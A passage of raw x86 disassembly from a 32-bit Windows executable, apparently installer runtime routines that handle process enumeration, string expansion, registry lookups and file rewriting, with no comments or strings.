  405dfb:	8d 8d c4 fc ff ff    	lea    -0x33c(%ebp),%ecx
  405e01:	51                   	push   %ecx
  405e02:	50                   	push   %eax
  405e03:	ff 15 18 81 40 00    	call   *0x408118
  405e09:	85 c0                	test   %eax,%eax
  405e0b:	0f 84 cc 00 00 00    	je     0x405edd
  405e11:	ff 45 08             	incl   0x8(%ebp)
  405e14:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405e17:	0f 82 77 ff ff ff    	jb     0x405d94
  405e1d:	ff 75 fc             	push   -0x4(%ebp)
  405e20:	ff 15 2c 81 40 00    	call   *0x40812c
  405e26:	83 bd dc fe ff ff 01 	cmpl   $0x1,-0x124(%ebp)
  405e2d:	0f 85 42 01 00 00    	jne    0x405f75
  405e33:	68 3c 89 40 00       	push   $0x40893c
  405e38:	ff 15 f0 80 40 00    	call   *0x4080f0
  405e3e:	8b f8                	mov    %eax,%edi
  405e40:	33 db                	xor    %ebx,%ebx
  405e42:	89 7d f0             	mov    %edi,-0x10(%ebp)
  405e45:	3b fb                	cmp    %ebx,%edi
  405e47:	0f 84 c3 fe ff ff    	je     0x405d10
  405e4d:	68 20 89 40 00       	push   $0x408920
  405e52:	57                   	push   %edi
  405e53:	ff d6                	call   *%esi
  405e55:	68 10 89 40 00       	push   $0x408910
  405e5a:	57                   	push   %edi
  405e5b:	89 45 08             	mov    %eax,0x8(%ebp)
  405e5e:	ff d6                	call   *%esi
  405e60:	68 00 89 40 00       	push   $0x408900
  405e65:	57                   	push   %edi
  405e66:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405e69:	ff d6                	call   *%esi
  405e6b:	68 f0 88 40 00       	push   $0x4088f0
  405e70:	57                   	push   %edi
  405e71:	89 45 f4             	mov    %eax,-0xc(%ebp)
  405e74:	ff d6                	call   *%esi
  405e76:	68 e0 88 40 00       	push   $0x4088e0
  405e7b:	57                   	push   %edi
  405e7c:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405e7f:	ff d6                	call   *%esi
  405e81:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405e84:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  405e87:	0f 84 1b 01 00 00    	je     0x405fa8
  405e8d:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  405e90:	0f 84 12 01 00 00    	je     0x405fa8
  405e96:	3b c3                	cmp    %ebx,%eax
  405e98:	0f 84 0a 01 00 00    	je     0x405fa8
  405e9e:	39 5d e8             	cmp    %ebx,-0x18(%ebp)
  405ea1:	0f 84 01 01 00 00    	je     0x405fa8
  405ea7:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  405eaa:	0f 84 f8 00 00 00    	je     0x405fa8
  405eb0:	53                   	push   %ebx
  405eb1:	6a 02                	push   $0x2
  405eb3:	ff 55 08             	call   *0x8(%ebp)
  405eb6:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405eb9:	83 f8 ff             	cmp    $0xffffffff,%eax
  405ebc:	0f 84 e6 00 00 00    	je     0x405fa8
  405ec2:	8d 8d 98 fa ff ff    	lea    -0x568(%ebp),%ecx
  405ec8:	51                   	push   %ecx
  405ec9:	bb 2c 02 00 00       	mov    $0x22c,%ebx
  405ece:	50                   	push   %eax
  405ecf:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  405ed5:	ff 55 f8             	call   *-0x8(%ebp)
  405ed8:	e9 8b 00 00 00       	jmp    0x405f68
  405edd:	8b 5d f0             	mov    -0x10(%ebp),%ebx
  405ee0:	33 f6                	xor    %esi,%esi
  405ee2:	46                   	inc    %esi
  405ee3:	e9 83 fe ff ff       	jmp    0x405d6b
  405ee8:	53                   	push   %ebx
  405ee9:	ff 15 38 81 40 00    	call   *0x408138
  405eef:	e9 1c fe ff ff       	jmp    0x405d10
  405ef4:	ff b5 a0 fa ff ff    	push   -0x560(%ebp)
  405efa:	6a 08                	push   $0x8
  405efc:	ff 55 08             	call   *0x8(%ebp)
  405eff:	8b f0                	mov    %eax,%esi
  405f01:	83 fe ff             	cmp    $0xffffffff,%esi
  405f04:	74 7c                	je     0x405f82
  405f06:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  405f0c:	50                   	push   %eax
  405f0d:	56                   	push   %esi
  405f0e:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  405f15:	04 00 00 
  405f18:	ff 55 e8             	call   *-0x18(%ebp)
  405f1b:	eb 2d                	jmp    0x405f4a
  405f1d:	8d 85 c4 fc ff ff    	lea    -0x33c(%ebp),%eax
  405f23:	50                   	push   %eax
  405f24:	8d 85 88 f4 ff ff    	lea    -0xb78(%ebp),%eax
  405f2a:	50                   	push   %eax
  405f2b:	ff 15 18 81 40 00    	call   *0x408118
  405f31:	85 c0                	test   %eax,%eax
  405f33:	74 67                	je     0x405f9c
  405f35:	8d 85 68 f4 ff ff    	lea    -0xb98(%ebp),%eax
  405f3b:	50                   	push   %eax
  405f3c:	56                   	push   %esi
  405f3d:	c7 85 68 f4 ff ff 28 	movl   $0x428,-0xb98(%ebp)
  405f44:	04 00 00 
  405f47:	ff 55 e0             	call   *-0x20(%ebp)
  405f4a:	85 c0                	test   %eax,%eax
  405f4c:	75 cf                	jne    0x405f1d
  405f4e:	56                   	push   %esi
  405f4f:	ff 15 bc 80 40 00    	call   *0x4080bc
  405f55:	8d 85 98 fa ff ff    	lea    -0x568(%ebp),%eax
  405f5b:	50                   	push   %eax
  405f5c:	ff 75 fc             	push   -0x4(%ebp)
  405f5f:	89 9d 98 fa ff ff    	mov    %ebx,-0x568(%ebp)
  405f65:	ff 55 f4             	call   *-0xc(%ebp)
  405f68:	85 c0                	test   %eax,%eax
  405f6a:	75 88                	jne    0x405ef4
  405f6c:	ff 75 fc             	push   -0x4(%ebp)
  405f6f:	ff 15 bc 80 40 00    	call   *0x4080bc
  405f75:	ff 75 f0             	push   -0x10(%ebp)
  405f78:	ff 15 38 81 40 00    	call   *0x408138
  405f7e:	33 c0                	xor    %eax,%eax
  405f80:	eb 31                	jmp    0x405fb3
  405f82:	be 5d 02 00 00       	mov    $0x25d,%esi
  405f87:	ff 75 fc             	push   -0x4(%ebp)
  405f8a:	ff 15 bc 80 40 00    	call   *0x4080bc
  405f90:	57                   	push   %edi
  405f91:	ff 15 38 81 40 00    	call   *0x408138
  405f97:	e9 df fd ff ff       	jmp    0x405d7b
  405f9c:	56                   	push   %esi
  405f9d:	ff 15 bc 80 40 00    	call   *0x4080bc
  405fa3:	33 f6                	xor    %esi,%esi
  405fa5:	46                   	inc    %esi
  405fa6:	eb df                	jmp    0x405f87
  405fa8:	57                   	push   %edi
  405fa9:	e9 3b ff ff ff       	jmp    0x405ee9
  405fae:	b8 78 02 00 00       	mov    $0x278,%eax
  405fb3:	5f                   	pop    %edi
  405fb4:	5e                   	pop    %esi
  405fb5:	5b                   	pop    %ebx
  405fb6:	c9                   	leave
  405fb7:	c2 04 00             	ret    $0x4
  405fba:	56                   	push   %esi
  405fbb:	8b 74 24 08          	mov    0x8(%esp),%esi
  405fbf:	56                   	push   %esi
  405fc0:	ff 15 70 81 40 00    	call   *0x408170
  405fc6:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405fc9:	50                   	push   %eax
  405fca:	56                   	push   %esi
  405fcb:	ff 15 0c 82 40 00    	call   *0x40820c
  405fd1:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405fd5:	74 0c                	je     0x405fe3
  405fd7:	68 c8 82 40 00       	push   $0x4082c8
  405fdc:	56                   	push   %esi
  405fdd:	ff 15 e8 80 40 00    	call   *0x4080e8
  405fe3:	8b c6                	mov    %esi,%eax
  405fe5:	5e                   	pop    %esi
  405fe6:	c2 04 00             	ret    $0x4
  405fe9:	56                   	push   %esi
  405fea:	8b 74 24 08          	mov    0x8(%esp),%esi
  405fee:	56                   	push   %esi
  405fef:	ff 15 70 81 40 00    	call   *0x408170
  405ff5:	8d 04 46             	lea    (%esi,%eax,2),%eax
  405ff8:	66 83 38 5c          	cmpw   $0x5c,(%eax)
  405ffc:	74 0c                	je     0x40600a
  405ffe:	50                   	push   %eax
  405fff:	56                   	push   %esi
  406000:	ff 15 0c 82 40 00    	call   *0x40820c
  406006:	3b c6                	cmp    %esi,%eax
  406008:	77 ee                	ja     0x405ff8
  40600a:	33 c9                	xor    %ecx,%ecx
  40600c:	66 89 08             	mov    %cx,(%eax)
  40600f:	83 c0 02             	add    $0x2,%eax
  406012:	5e                   	pop    %esi
  406013:	c2 04 00             	ret    $0x4
  406016:	56                   	push   %esi
  406017:	57                   	push   %edi
  406018:	ff 74 24 0c          	push   0xc(%esp)
  40601c:	be a0 62 45 00       	mov    $0x4562a0,%esi
  406021:	56                   	push   %esi
  406022:	e8 65 fa ff ff       	call   0x405a8c
  406027:	56                   	push   %esi
  406028:	e8 ae f7 ff ff       	call   0x4057db
  40602d:	8b f8                	mov    %eax,%edi
  40602f:	85 ff                	test   %edi,%edi
  406031:	75 04                	jne    0x406037
  406033:	33 c0                	xor    %eax,%eax
  406035:	eb 5e                	jmp    0x406095
  406037:	57                   	push   %edi
  406038:	e8 7e fa ff ff       	call   0x405abb
  40603d:	f6 05 e8 05 47 00 80 	testb  $0x80,0x4705e8
  406044:	74 0e                	je     0x406054
  406046:	0f b7 07             	movzwl (%edi),%eax
  406049:	66 85 c0             	test   %ax,%ax
  40604c:	74 e5                	je     0x406033
  40604e:	66 83 f8 5c          	cmp    $0x5c,%ax
  406052:	74 df                	je     0x406033
  406054:	2b fe                	sub    %esi,%edi
  406056:	53                   	push   %ebx
  406057:	8b 1d 70 81 40 00    	mov    0x408170,%ebx
  40605d:	d1 ff                	sar    $1,%edi
  40605f:	eb 15                	jmp    0x406076
  406061:	56                   	push   %esi
  406062:	e8 05 fb ff ff       	call   0x405b6c
  406067:	85 c0                	test   %eax,%eax
  406069:	74 05                	je     0x406070
  40606b:	f6 00 10             	testb  $0x10,(%eax)
  40606e:	74 2a                	je     0x40609a
  406070:	56                   	push   %esi
  406071:	e8 73 ff ff ff       	call   0x405fe9
  406076:	56                   	push   %esi
  406077:	ff d3                	call   *%ebx
  406079:	3b c7                	cmp    %edi,%eax
  40607b:	7f e4                	jg     0x406061
  40607d:	56                   	push   %esi
  40607e:	e8 37 ff ff ff       	call   0x405fba
  406083:	56                   	push   %esi
  406084:	ff 15 7c 80 40 00    	call   *0x40807c
  40608a:	33 c9                	xor    %ecx,%ecx
  40608c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40608f:	0f 95 c1             	setne  %cl
  406092:	8b c1                	mov    %ecx,%eax
  406094:	5b                   	pop    %ebx
  406095:	5f                   	pop    %edi
  406096:	5e                   	pop    %esi
  406097:	c2 04 00             	ret    $0x4
  40609a:	33 c0                	xor    %eax,%eax
  40609c:	eb f6                	jmp    0x406094
  40609e:	55                   	push   %ebp
  40609f:	8b ec                	mov    %esp,%ebp
  4060a1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4060a4:	83 ec 18             	sub    $0x18,%esp
  4060a7:	85 c0                	test   %eax,%eax
  4060a9:	7d 11                	jge    0x4060bc
  4060ab:	8b 0d 68 85 46 00    	mov    0x468568,%ecx
  4060b1:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4060b8:	2b c8                	sub    %eax,%ecx
  4060ba:	8b 01                	mov    (%ecx),%eax
  4060bc:	8b 0d b8 05 47 00    	mov    0x4705b8,%ecx
  4060c2:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  4060c5:	b8 00 05 46 00       	mov    $0x460500,%eax
  4060ca:	57                   	push   %edi
  4060cb:	8b f8                	mov    %eax,%edi
  4060cd:	39 45 08             	cmp    %eax,0x8(%ebp)
  4060d0:	72 16                	jb     0x4060e8
  4060d2:	8b 55 08             	mov    0x8(%ebp),%edx
  4060d5:	2b d0                	sub    %eax,%edx
  4060d7:	d1 fa                	sar    $1,%edx
  4060d9:	81 fa 08 40 00 00    	cmp    $0x4008,%edx
  4060df:	73 07                	jae    0x4060e8
  4060e1:	8b 7d 08             	mov    0x8(%ebp),%edi
  4060e4:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  4060e8:	0f b7 11             	movzwl (%ecx),%edx
  4060eb:	66 85 d2             	test   %dx,%dx
  4060ee:	0f 84 23 02 00 00    	je     0x406317
  4060f4:	53                   	push   %ebx
  4060f5:	56                   	push   %esi
  4060f6:	8b f7                	mov    %edi,%esi
  4060f8:	2b f0                	sub    %eax,%esi
  4060fa:	83 e6 fe             	and    $0xfffffffe,%esi
  4060fd:	81 fe 08 40 00 00    	cmp    $0x4008,%esi
  406103:	0f 8d 0c 02 00 00    	jge    0x406315
  406109:	0f b7 d2             	movzwl %dx,%edx
  40610c:	41                   	inc    %ecx
  40610d:	be 00 e0 00 00       	mov    $0xe000,%esi
  406112:	41                   	inc    %ecx
  406113:	89 55 0c             	mov    %edx,0xc(%ebp)
  406116:	85 d6                	test   %edx,%esi
  406118:	0f 84 d5 01 00 00    	je     0x4062f3
  40611e:	8b de                	mov    %esi,%ebx
  406120:	66 3b d3             	cmp    %bx,%dx
  406123:	0f 86 ca 01 00 00    	jbe    0x4062f3
  406129:	0f b7 01             	movzwl (%ecx),%eax
  40612c:	8b d8                	mov    %eax,%ebx
  40612e:	8b f0                	mov    %eax,%esi
  406130:	c1 e8 08             	shr    $0x8,%eax
  406133:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  406139:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40613c:	0d 00 80 00 00       	or     $0x8000,%eax
  406141:	8b d3                	mov    %ebx,%edx
  406143:	81 ca 00 80 00 00    	or     $0x8000,%edx
  406149:	81 e6 ff 7f 00 00    	and    $0x7fff,%esi
  40614f:	41                   	inc    %ecx
  406150:	89 45 f0             	mov    %eax,-0x10(%ebp)
  406153:	41                   	inc    %ecx
  406154:	b8 02 e0 00 00       	mov    $0xe002,%eax
  406159:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  40615c:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40615f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  406162:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  406166:	0f 85 1a 01 00 00    	jne    0x406286
  40616c:	6a 02                	push   $0x2
  40616e:	5e                   	pop    %esi
  40616f:	ff 15 08 81 40 00    	call   *0x408108
  406175:	85 c0                	test   %eax,%eax
  406177:	79 1c                	jns    0x406195
  406179:	b9 04 5a 00 00       	mov    $0x5a04,%ecx
  40617e:	66 3b c1             	cmp    %cx,%ax
  406181:	74 12                	je     0x406195
  406183:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  406187:	74 0c                	je     0x406195
  406189:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  40618d:	74 06                	je     0x406195
  40618f:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  406193:	eb 07                	jmp    0x40619c
  406195:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  40619c:	83 3d 44 06 47 00 00 	cmpl   $0x0,0x470644
  4061a3:	74 03                	je     0x4061a8
  4061a5:	6a 04                	push   $0x4
  4061a7:	5e                   	pop    %esi
  4061a8:	84 db                	test   %bl,%bl
  4061aa:	79 3a                	jns    0x4061e6
  4061ac:	8b c3                	mov    %ebx,%eax
  4061ae:	83 e0 40             	and    $0x40,%eax
  4061b1:	50                   	push   %eax
  4061b2:	a1 b8 05 47 00       	mov    0x4705b8,%eax
  4061b7:	57                   	push   %edi
  4061b8:	83 e3 3f             	and    $0x3f,%ebx
  4061bb:	8d 04 58             	lea    (%eax,%ebx,2),%eax
  4061be:	50                   	push   %eax
  4061bf:	68 18 88 40 00       	push   $0x408818
  4061c4:	68 02 00 00 80       	push   $0x80000002
  4061c9:	e8 87 f7 ff ff       	call   0x405955
  4061ce:	66 83 3f 00          	cmpw   $0x0,(%edi)
  4061d2:	0f 85 9a 00 00 00    	jne    0x406272
  4061d8:	ff 75 f4             	push   -0xc(%ebp)
  4061db:	57                   	push   %edi
  4061dc:	e8 bd fe ff ff       	call   0x40609e
  4061e1:	e9 86 00 00 00       	jmp    0x40626c
  4061e6:	83 fb 25             	cmp    $0x25,%ebx
  4061e9:	75 0e                	jne    0x4061f9
  4061eb:	68 04 20 00 00       	push   $0x2004
  4061f0:	57                   	push   %edi
  4061f1:	ff 15 04 81 40 00    	call   *0x408104
  4061f7:	eb 73                	jmp    0x40626c
  4061f9:	83 fb 24             	cmp    $0x24,%ebx
  4061fc:	75 6a                	jne    0x406268
  4061fe:	68 04 20 00 00       	push   $0x2004
  406203:	57                   	push   %edi
  406204:	ff 15 a8 80 40 00    	call   *0x4080a8
  40620a:	33 f6                	xor    %esi,%esi
  40620c:	eb 5a                	jmp    0x406268
  40620e:	a1 90 05 47 00       	mov    0x470590,%eax
  406213:	33 c9                	xor    %ecx,%ecx
  406215:	4e                   	dec    %esi
  406216:	3b c1                	cmp    %ecx,%eax
  406218:	74 18                	je     0x406232
  40621a:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40621d:	74 13                	je     0x406232
  40621f:	57                   	push   %edi
  406220:	51                   	push   %ecx
  406221:	51                   	push   %ecx
  406222:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  406226:	ff 35 94 05 47 00    	push   0x470594
  40622c:	ff d0                	call   *%eax
  40622e:	85 c0                	test   %eax,%eax
  406230:	74 3a                	je     0x40626c
  406232:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406235:	50                   	push   %eax
  406236:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  40623a:	ff 35 94 05 47 00    	push   0x470594
  406240:	ff 15 8c 81 40 00    	call   *0x40818c
  406246:	85 c0                	test   %eax,%eax
  406248:	75 19                	jne    0x406263
  40624a:	57                   	push   %edi
  40624b:	ff 75 fc             	push   -0x4(%ebp)
  40624e:	ff 15 7c 81 40 00    	call   *0x40817c
  406254:	ff 75 fc             	push   -0x4(%ebp)
  406257:	8b d8                	mov    %eax,%ebx
  406259:	ff 15 ac 82 40 00    	call   *0x4082ac
  40625f:	85 db                	test   %ebx,%ebx
  406261:	75 09                	jne    0x40626c
  406263:	33 c0                	xor    %eax,%eax
  406265:	66 89 07             	mov    %ax,(%edi)
  406268:	85 f6                	test   %esi,%esi
  40626a:	75 a2                	jne    0x40620e
  40626c:	66 83 3f 00          	cmpw   $0x0,(%edi)
  406270:	74 4e                	je     0x4062c0
  406272:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  406276:	75 48                	jne    0x4062c0
  406278:	68 70 88 40 00       	push   $0x408870
  40627d:	57                   	push   %edi
  40627e:	ff 15 e8 80 40 00    	call   *0x4080e8
  406284:	eb 3a                	jmp    0x4062c0
  406286:	b8 01 e0 00 00       	mov    $0xe001,%eax
  40628b:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  40628f:	75 37                	jne    0x4062c8
  406291:	83 fe 1d             	cmp    $0x1d,%esi
  406294:	75 0e                	jne    0x4062a4
  406296:	ff 35 94 05 47 00    	push   0x470594
  40629c:	57                   	push   %edi
  40629d:	e8 31 f7 ff ff       	call   0x4059d3
  4062a2:	eb 14                	jmp    0x4062b8
  4062a4:	8b c6                	mov    %esi,%eax
  4062a6:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  4062ac:	05 00 10 47 00       	add    $0x471000,%eax
  4062b1:	50                   	push   %eax
  4062b2:	57                   	push   %edi
  4062b3:	e8 d4 f7 ff ff       	call   0x405a8c
  4062b8:	83 c6 eb             	add    $0xffffffeb,%esi
  4062bb:	83 fe 07             	cmp    $0x7,%esi
  4062be:	73 1f                	jae    0x4062df
  4062c0:	57                   	push   %edi
  4062c1:	e8 f5 f7 ff ff       	call   0x405abb
  4062c6:	eb 17                	jmp    0x4062df
  4062c8:	b8 03 e0 00 00       	mov    $0xe003,%eax
  4062cd:	66 39 45 0c          	cmp    %ax,0xc(%ebp)
  4062d1:	75 0c                	jne    0x4062df
  4062d3:	83 c8 ff             	or     $0xffffffff,%eax
  4062d6:	2b c6                	sub    %esi,%eax
  4062d8:	50                   	push   %eax
  4062d9:	57                   	push   %edi
  4062da:	e8 bf fd ff ff       	call   0x40609e
  4062df:	57                   	push   %edi
  4062e0:	ff 15 70 81 40 00    	call   *0x408170
  4062e6:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4062e9:	8d 3c 47             	lea    (%edi,%eax,2),%edi
  4062ec:	b8 00 05 46 00       	mov    $0x460500,%eax
  4062f1:	eb 16                	jmp    0x406309
  4062f3:	66 3b d6             	cmp    %si,%dx
  4062f6:	75 0c                	jne    0x406304
  4062f8:	66 8b 11             	mov    (%ecx),%dx
  4062fb:	66 89 17             	mov    %dx,(%edi)
  4062fe:	47                   	inc    %edi
  4062ff:	47                   	inc    %edi
  406300:	41                   	inc    %ecx
  406301:	41                   	inc    %ecx
  406302:	eb 05                	jmp    0x406309
  406304:	66 89 17             	mov    %dx,(%edi)
  406307:	47                   	inc    %edi
  406308:	47                   	inc    %edi
  406309:	0f b7 11             	movzwl (%ecx),%edx
  40630c:	66 85 d2             	test   %dx,%dx
  40630f:	0f 85 e1 fd ff ff    	jne    0x4060f6
  406315:	5e                   	pop    %esi
  406316:	5b                   	pop    %ebx
  406317:	33 c9                	xor    %ecx,%ecx
  406319:	66 89 0f             	mov    %cx,(%edi)
  40631c:	5f                   	pop    %edi
  40631d:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  406320:	74 09                	je     0x40632b
  406322:	50                   	push   %eax
  406323:	ff 75 08             	push   0x8(%ebp)
  406326:	e8 61 f7 ff ff       	call   0x405a8c
  40632b:	c9                   	leave
  40632c:	c2 08 00             	ret    $0x8
  40632f:	51                   	push   %ecx
  406330:	53                   	push   %ebx
  406331:	55                   	push   %ebp
  406332:	56                   	push   %esi
  406333:	57                   	push   %edi
  406334:	68 ac 89 40 00       	push   $0x4089ac
  406339:	bb a8 a2 45 00       	mov    $0x45a2a8,%ebx
  40633e:	53                   	push   %ebx
  40633f:	ff 15 fc 80 40 00    	call   *0x4080fc
  406345:	8b 7c 24 1c          	mov    0x1c(%esp),%edi
  406349:	33 ed                	xor    %ebp,%ebp
  40634b:	be 00 04 00 00       	mov    $0x400,%esi
  406350:	3b fd                	cmp    %ebp,%edi
  406352:	74 29                	je     0x40637d
  406354:	6a 01                	push   $0x1
  406356:	55                   	push   %ebp
  406357:	57                   	push   %edi
  406358:	e8 75 f5 ff ff       	call   0x4058d2
  40635d:	50                   	push   %eax
  40635e:	ff 15 bc 80 40 00    	call   *0x4080bc
  406364:	56                   	push   %esi
  406365:	53                   	push   %ebx
  406366:	57                   	push   %edi
  406367:	ff 15 6c 80 40 00    	call   *0x40806c
  40636d:	3b c5                	cmp    %ebp,%eax
  40636f:	0f 84 7f 01 00 00    	je     0x4064f4
  406375:	3b c6                	cmp    %esi,%eax
  406377:	0f 8f 77 01 00 00    	jg     0x4064f4
  40637d:	56                   	push   %esi
  40637e:	bf 00 f9 45 00       	mov    $0x45f900,%edi
  406383:	57                   	push   %edi
  406384:	ff 74 24 20          	push   0x20(%esp)
  406388:	ff 15 6c 80 40 00    	call   *0x40806c
  40638e:	3b c5                	cmp    %ebp,%eax
  406390:	0f 84 5e 01 00 00    	je     0x4064f4
  406396:	3b c6                	cmp    %esi,%eax
  406398:	0f 8f 56 01 00 00    	jg     0x4064f4
  40639e:	55                   	push   %ebp
  40639f:	55                   	push   %ebp
  4063a0:	56                   	push   %esi
  4063a1:	68 a8 aa 45 00       	push   $0x45aaa8
  4063a6:	6a ff                	push   $0xffffffff
  4063a8:	53                   	push   %ebx
  4063a9:	8b 1d 44 81 40 00    	mov    0x408144,%ebx
  4063af:	55                   	push   %ebp
  4063b0:	55                   	push   %ebp
  4063b1:	ff d3                	call   *%ebx
  4063b3:	85 c0                	test   %eax,%eax
  4063b5:	0f 84 39 01 00 00    	je     0x4064f4
  4063bb:	55                   	push   %ebp
  4063bc:	55                   	push   %ebp
  4063bd:	56                   	push   %esi
  4063be:	be f8 b0 45 00       	mov    $0x45b0f8,%esi
  4063c3:	56                   	push   %esi
  4063c4:	6a ff                	push   $0xffffffff
  4063c6:	57                   	push   %edi
  4063c7:	55                   	push   %ebp
  4063c8:	55                   	push   %ebp
  4063c9:	ff d3                	call   *%ebx
  4063cb:	85 c0                	test   %eax,%eax
  4063cd:	0f 84 21 01 00 00    	je     0x4064f4
  4063d3:	56                   	push   %esi
  4063d4:	68 a8 aa 45 00       	push   $0x45aaa8
  4063d9:	68 a4 89 40 00       	push   $0x4089a4
  4063de:	68 f8 b4 45 00       	push   $0x45b4f8
  4063e3:	ff 15 18 82 40 00    	call   *0x408218
  4063e9:	83 c4 10             	add    $0x10,%esp
  4063ec:	8b d8                	mov    %eax,%ebx
  4063ee:	a1 9c 05 47 00       	mov    0x47059c,%eax
  4063f3:	ff b0 28 01 00 00    	push   0x128(%eax)
  4063f9:	57                   	push   %edi
  4063fa:	e8 9f fc ff ff       	call   0x40609e
  4063ff:	6a 04                	push   $0x4
  406401:	68 00 00 00 c0       	push   $0xc0000000
  406406:	57                   	push   %edi
  406407:	e8 c6 f4 ff ff       	call   0x4058d2
  40640c:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  406410:	83 f8 ff             	cmp    $0xffffffff,%eax
  406413:	0f 84 db 00 00 00    	je     0x4064f4
  406419:	55                   	push   %ebp
  40641a:	50                   	push   %eax
  40641b:	ff 15 94 80 40 00    	call   *0x408094
  406421:	8b f8                	mov    %eax,%edi
  406423:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  406427:	50                   	push   %eax
  406428:	6a 40                	push   $0x40
  40642a:	ff 15 20 81 40 00    	call   *0x408120
  406430:	8b f0                	mov    %eax,%esi
  406432:	3b f5                	cmp    %ebp,%esi
  406434:	0f 84 b0 00 00 00    	je     0x4064ea
  40643a:	55                   	push   %ebp
  40643b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40643f:	50                   	push   %eax
  406440:	57                   	push   %edi
  406441:	56                   	push   %esi
  406442:	ff 74 24 2c          	push   0x2c(%esp)
  406446:	ff 15 54 81 40 00    	call   *0x408154
  40644c:	85 c0                	test   %eax,%eax
  40644e:	0f 84 96 00 00 00    	je     0x4064ea
  406454:	3b 7c 24 10          	cmp    0x10(%esp),%edi
  406458:	0f 85 8c 00 00 00    	jne    0x4064ea
  40645e:	68 00 88 40 00       	push   $0x408800
  406463:	56                   	push   %esi
  406464:	e8 cf f3 ff ff       	call   0x405838
  406469:	3b c5                	cmp    %ebp,%eax
  40646b:	75 14                	jne    0x406481
  40646d:	68 00 88 40 00       	push   $0x408800
  406472:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  406475:	50                   	push   %eax
  406476:	ff 15 0c 81 40 00    	call   *0x40810c
  40647c:	83 c7 0a             	add    $0xa,%edi
  40647f:	eb 31                	jmp    0x4064b2
  406481:	68 a0 89 40 00       	push   $0x4089a0
  406486:	83 c0 0a             	add    $0xa,%eax
  406489:	50                   	push   %eax
  40648a:	e8 a9 f3 ff ff       	call   0x405838
  40648f:	8b e8                	mov    %eax,%ebp
  406491:	85 ed                	test   %ebp,%ebp
  406493:	74 1b                	je     0x4064b0
  406495:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  406498:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  40649b:	eb 06                	jmp    0x4064a3
  40649d:	8a 11                	mov    (%ecx),%dl
  40649f:	88 10                	mov    %dl,(%eax)
  4064a1:	48                   	dec    %eax
  4064a2:	49                   	dec    %ecx
  4064a3:	3b cd                	cmp    %ebp,%ecx
  4064a5:	77 f6                	ja     0x40649d
  4064a7:	2b ee                	sub    %esi,%ebp
  4064a9:	45                   	inc    %ebp
  4064aa:	8b c5                	mov    %ebp,%eax
  4064ac:	33 ed                	xor    %ebp,%ebp
  4064ae:	eb 04                	jmp    0x4064b4
  4064b0:	33 ed                	xor    %ebp,%ebp
  4064b2:	8b c7                	mov    %edi,%eax
  4064b4:	53                   	push   %ebx
  4064b5:	68 f8 b4 45 00       	push   $0x45b4f8
  4064ba:	03 c6                	add    %esi,%eax
  4064bc:	50                   	push   %eax
  4064bd:	e8 cc f3 ff ff       	call   0x40588e
  4064c2:	55                   	push   %ebp
  4064c3:	55                   	push   %ebp
  4064c4:	55                   	push   %ebp
  4064c5:	ff 74 24 28          	push   0x28(%esp)
  4064c9:	ff 15 5c 81 40 00    	call   *0x40815c
  4064cf:	55                   	push   %ebp
  4064d0:	8d 44 24 14          	lea    0x14(%esp),%eax
  4064d4:	50                   	push   %eax
  4064d5:	03 fb                	add    %ebx,%edi
  4064d7:	57                   	push   %edi
  4064d8:	56                   	push   %esi
  4064d9:	ff 74 24 2c          	push   0x2c(%esp)
  4064dd:	ff 15 50 81 40 00    	call   *0x408150
  4064e3:	56                   	push   %esi
  4064e4:	ff 15 2c 81 40 00    	call   *0x40812c
  4064ea:	ff 74 24 1c          	push   0x1c(%esp)
  4064ee:	ff 15 bc 80 40 00    	call   *0x4080bc
  4064f4:	5f                   	pop    %edi
  4064f5:	5e                   	pop    %esi
  4064f6:	5d                   	pop    %ebp
  4064f7:	5b                   	pop    %ebx
  4064f8:	59                   	pop    %ecx
  4064f9:	c3                   	ret
  4064fa:	6a 01                	push   $0x1
  4064fc:	e8 92 f6 ff ff       	call   0x405b93
  406501:	85 c0                	test   %eax,%eax
  406503:	74 10                	je     0x406515
  406505:	6a 05                	push   $0x5
  406507:	ff 74 24 0c          	push   0xc(%esp)
  40650b:	ff 74 24 0c          	push   0xc(%esp)
  40650f:	ff d0                	call   *%eax
  406511:	85 c0                	test   %eax,%eax
  406513:	75 0f                	jne    0x406524
